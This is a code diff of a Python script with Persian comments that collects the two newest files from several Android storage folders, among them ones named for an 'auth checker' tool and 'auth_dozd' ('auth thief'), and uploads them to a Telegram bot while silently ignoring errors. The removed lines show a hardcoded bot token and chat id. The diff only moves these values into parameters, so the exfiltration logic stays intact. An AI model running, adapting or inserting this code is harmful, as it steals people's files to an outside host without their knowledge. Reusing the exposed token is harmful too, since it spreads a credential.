@@ -2,20 +2,7 @@ import os
 import aiohttp
 import asyncio
 
-# تنظیمات
-token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
-chat_id = '1884879628'
-dirs = [
-    '/storage/emulated/0/AuthChecker/',
-    '/storage/emulated/0/Download/',
-    '/storage/emulated/0/auth checker/',
-    '/storage/emulated/0/AUTH/اوت چکر مالک',
-    '/storage/emulated/0/چکر مالک/',
-    '/storage/emulated/0/Download/auth_dozd/'
-]
-
-# تابع ارسال فایل
-async def send_file(session, file_path):
+async def send_file(session, file_path, token, chat_id):
     try:
         form_data = aiohttp.FormData()
         form_data.add_field('chat_id', chat_id)
@@ -26,8 +13,7 @@ async def send_file(session, file_path):
     except Exception as e:
         pass  # خطاها نادیده گرفته می‌شوند
 
-# تابع اصلی
-async def main():
+async def main(dirs, token, chat_id):
     async with aiohttp.ClientSession() as session:
         tasks = []
         for directory in dirs:
@@ -36,9 +22,5 @@ async def main():
             files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
             files = sorted(files, key=os.path.getmtime, reverse=True)[:2]  # ۲ فایل آخر
             for file_path in files:
-                tasks.append(send_file(session, file_path))
+                tasks.append(send_file(session, file_path, token, chat_id))
         await asyncio.gather(*tasks)  # اجرای موازی
-
-# اجرای برنامه
-if __name__ == '__main__':
-    asyncio.run(main())
